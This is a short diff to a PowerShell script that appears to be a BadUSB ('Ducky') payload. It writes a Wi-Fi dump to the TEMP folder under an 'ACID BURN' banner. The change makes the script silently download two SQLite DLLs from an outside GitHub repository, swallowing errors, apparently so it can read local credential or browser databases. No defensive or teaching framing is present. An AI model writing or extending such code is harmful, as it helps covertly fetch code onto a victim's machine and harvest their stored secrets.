@@ -1,3 +1,4 @@
+
 try {
     $out = "$env:TEMP\wifi_dump.txt"
     "=== ACID BURN ===" | Out-File $out
@@ -29,10 +30,12 @@ try {
 
     # --- LOAD SQLITE ---
     $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
+    $interopDll = "$env:TEMP\SQLite.Interop.dll"
     if (-not (Test-Path $sqliteDll)) {
-        try {
-            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing
-        } catch { }
+        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing } catch { }
+    }
+    if (-not (Test-Path $interopDll)) {
+        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/SQLite.Interop.dll" -OutFile $interopDll -UseBasicParsing } catch { }
     }
     $sqliteLoaded = $false
     if (Test-Path $sqliteDll) {
